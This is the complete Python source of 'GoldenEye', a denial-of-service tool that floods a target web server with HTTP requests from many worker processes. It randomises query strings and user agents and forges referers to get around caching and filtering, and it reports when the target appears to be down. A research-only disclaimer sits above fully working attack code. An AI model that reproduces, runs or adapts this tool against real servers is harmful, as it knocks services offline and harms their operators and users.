#!/usr/bin/env python3

"""
$Id: $

     /$$$$$$            /$$       /$$                     /$$$$$$$$                    
    /$$__  $$          | $$      | $$                    | $$_____/                    
   | $$  \__/  /$$$$$$ | $$  /$$$$$$$  /$$$$$$  /$$$$$$$ | $$       /$$   /$$  /$$$$$$ 
   | $$ /$$$$ /$$__  $$| $$ /$$__  $$ /$$__  $$| $$__  $$| $$$$$   | $$  | $$ /$$__  $$
   | $$|_  $$| $$  \ $$| $$| $$  | $$| $$$$$$$$| $$  \ $$| $$__/   | $$  | $$| $$$$$$$$
   | $$  \ $$| $$  | $$| $$| $$  | $$| $$_____/| $$  | $$| $$      | $$  | $$| $$_____/
   |  $$$$$$/|  $$$$$$/| $$|  $$$$$$$|  $$$$$$$| $$  | $$| $$$$$$$$|  $$$$$$$|  $$$$$$$
    \______/  \______/ |__/ \_______/ \_______/|__/  |__/|________/ \____  $$ \_______/
                                                                     /$$  | $$          
                                                                    |  $$$$$$/          
                                                                     \______/           


This tool is a DoS tool that is meant to put heavy load on HTTP servers
in order to bring them to their knees by exhausting the resource pool.

This tool is meant for research purposes only
and any malicious usage of this tool is prohibited.

@author Jan Seidl <http://wroot.org/>

@date 2013-03-26
@version 2.0

@TODO Test in python 3.x

LICENSE:
This software is distributed under the GNU General Public License version 3 (GPLv3)

LEGAL NOTICE:
THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY!
IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY
THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT.
BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.
"""

from multiprocessing import Process, Manager
import urllib.parse
import ssl
import sys
import getopt
import random
import time
import http.client as HTTPCLIENT

####
# Config
####
DEBUG = False

####
# Constants
####
METHOD_GET = 'get'
METHOD_POST = 'post'
METHOD_RAND = 'random'

JOIN_TIMEOUT = 1.0

DEFAULT_WORKERS = 50
DEFAULT_SOCKETS = 30

####
# GoldenEye Class
####

class GoldenEye(object):

    # Counters
    counter = [0, 0]
    last_counter = [0, 0]

    # Containers
    workersQueue = []
    manager = None

    # Properties
    url = None

    # Options
    nr_workers = DEFAULT_WORKERS
    nr_sockets = DEFAULT_SOCKETS
    method = METHOD_GET

    def __init__(self, url):

        # Set URL
        self.url = url

        # Initialize Manager
        self.manager = Manager()

        # Initialize Counters
        self.counter = self.manager.list((0, 0))

    def exit(self):
        self.stats()
        print("Shutting down GoldenEye")

    def __del__(self):
        self.exit()

    def printHeader(self):

        # Taunt!
        print("GoldenEye firing!")

    # Do the fun!
    def fire(self):

        self.printHeader()
        print(f"Hitting webserver in mode {self.method} with {self.nr_workers} workers running {self.nr_sockets} connections each")

        if DEBUG:
            print(f"Starting {self.nr_workers} concurrent Laser workers")

        # Start workers
        for i in range(int(self.nr_workers)):

            try:
                worker = Laser(self.url, self.nr_sockets, self.counter)
                worker.method = self.method

                self.workersQueue.append(worker)
                worker.start()
            except Exception as e:
                error(f"Failed to start worker {i}")
                if DEBUG:
                    print(e)
                pass 

        print("Initiating monitor")
        self.monitor()

    def stats(self):

        try:
            if self.counter[0] > 0 or self.counter[1] > 0:

                print(f"{self.counter[0]} GoldenEye punches deferred. ({self.counter[1]} Failed)")

                if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
                    print("\tServer may be DOWN!")
    
                self.last_counter[0] = self.counter[0]
                self.last_counter[1] = self.counter[1]
        except Exception:
            pass # silently ignore

    def monitor(self):
        while len(self.workersQueue) > 0:
            try:
                for worker in self.workersQueue:
                    if worker is not None and worker.is_alive():
                        worker.join(JOIN_TIMEOUT)
                    else:
                        self.workersQueue.remove(worker)

                self.stats()

            except (KeyboardInterrupt, SystemExit):
                print("CTRL+C received. Killing all workers")
                for worker in self.workersQueue:
                    try:
                        if DEBUG:
                            print(f"Killing worker {worker.name}")
                        #worker.terminate()
                        worker.stop()
                    except Exception:
                        pass # silently ignore
                if DEBUG:
                    raise
                else:
                    pass

####
# Laser Class
####

class Laser(Process):

        
    # Counters
    request_count = 0
    failed_count = 0

    # Containers
    url = None
    host = None
    port = 80
    ssl = False
    referers = []
    useragents = []
    socks = []
    counter = None
    nr_socks = DEFAULT_SOCKETS

    # Flags
    runnable = True

    # Options
    method = METHOD_GET

    def __init__(self, url, nr_sockets, counter):

        super(Laser, self).__init__()

        self.counter = counter
        self.nr_socks = nr_sockets

        parsedUrl = urllib.parse.urlparse(url)

        if parsedUrl.scheme == 'https':
            self.ssl = True

        self.host = parsedUrl.netloc.split(':')[0]
        self.url = parsedUrl.path

        self.port = parsedUrl.port

        if not self.port:
            self.port = 80 if not self.ssl else 443

        self.referers = [ 
            'http://www.google.com/?q=',
            'http://www.usatoday.com/search/results?q=',
            'http://engadget.search.aol.com/search?q=',
            'http://' + self.host + '/'
        ]

        self.useragents = [
            'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
            'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
            'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
            'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.6.30 Version/10.63',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0) Gecko/20100101 Firefox/4.0',
            'Mozilla/5.0 (Windows NT 6.1; rv:2.0) Gecko/20100101 Firefox/4.0',
            'Mozilla/5.0 (Windows NT 5.1; rv:2.0) Gecko/20100101 Firefox/4.0',
            'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13',
            'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en; rv:1.9.1.3) Gecko/20090908 Firefox/3.5.3',
            'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
            'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
            'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
            'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
            'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
            'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1'
        ]

        self.runnable = True

    # Send single request
    def send(self, req_url):
        
        try:
            referer = random.choice(self.referers) + self.rand_str(5, 10)

            if self.ssl:
                conn = HTTPCLIENT.HTTPSConnection(self.host, self.port)
            else:
                conn = HTTPCLIENT.HTTPConnection(self.host, self.port)

            self.socks.append(conn)

            for i in range(self.nr_socks):

                if self.method == METHOD_RAND:
                    self.method = random.choice([METHOD_GET, METHOD_POST])

                if self.method == METHOD_GET:
                    url = req_url + "?" + self.rand_str(5, 10)
                    conn.request("GET", url, None, {'User-Agent': random.choice(self.useragents), 'Referer': referer})
                elif self.method == METHOD_POST:
                    url = req_url
                    post_data = self.rand_str(5, 10)
                    conn.request("POST", url, post_data, {'User-Agent': random.choice(self.useragents), 'Referer': referer})
                else:
                    return False

                self.request_count += 1

            conn.close()
            self.counter[0] += 1

        except Exception:
            self.counter[1] += 1
            return False

        return True

    # Generate random string for GET parameters
    def rand_str(self, min_len, max_len):

        chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        return ''.join(random.choice(chars) for x in range(random.randint(min_len, max_len)))

    # Main process loop
    def run(self):

        while self.runnable:
            self.send(self.url)

    def stop(self):

        self.runnable = False
        self.terminate()

####
# Functions
####

def usage():

    print(f"USAGE: {sys.argv[0]} [-u <url>] [-w <workers>] [-s <sockets>] [-m <get|post|random>] [-d]")
    print("\t -u | --url <url> : URL target")
    print("\t -w | --workers <workers> : Number of concurrent workers (default: %d)" % DEFAULT_WORKERS)
    print("\t -s | --sockets <sockets> : Number of concurrent sockets per worker (default: %d)" % DEFAULT_SOCKETS)
    print("\t -m | --method <get|post|random> : HTTP Method to use (default: %s)" % METHOD_GET)
    print("\t -d | --debug : Enable debug mode")
    print("\n\nFUN:")
    print("\t %s -u http://target.com -w 10 -s 50 -m random\n" % sys.argv[0])


def error(msg):

    print(f"\n[ERROR] {msg}\n")

def main(argv):

    try:
        opts, args = getopt.getopt(argv, "hu:w:s:m:d", ["help", "url=", "workers=", "sockets=", "method=", "debug"])
    except getopt.GetoptError:
        usage()
        sys.exit(2)

    url = None
    workers = DEFAULT_WORKERS
    socks = DEFAULT_SOCKETS
    method = METHOD_GET
    debug = False

    for opt, arg in opts:
        if opt in ("-h", "--help"):
            usage()
            sys.exit()
        elif opt in ("-u", "--url"):
            url = arg
        elif opt in ("-w", "--workers"):
            workers = int(arg)
        elif opt in ("-s", "--sockets"):
            socks = int(arg)
        elif opt in ("-m", "--method"):
            method = arg.lower()
        elif opt in ("-d", "--debug"):
            debug = True

    if url is None:
        error("URL target is missing")
        usage()
        sys.exit(2)

    global DEBUG
    DEBUG = debug

    if DEBUG:
        print("DEBUG MODE ENABLED")

    ge = GoldenEye(url)
    ge.nr_workers = workers
    ge.nr_sockets = socks
    ge.method = method

    ge.fire()

if __name__ == "__main__":
    main(sys.argv[1:])
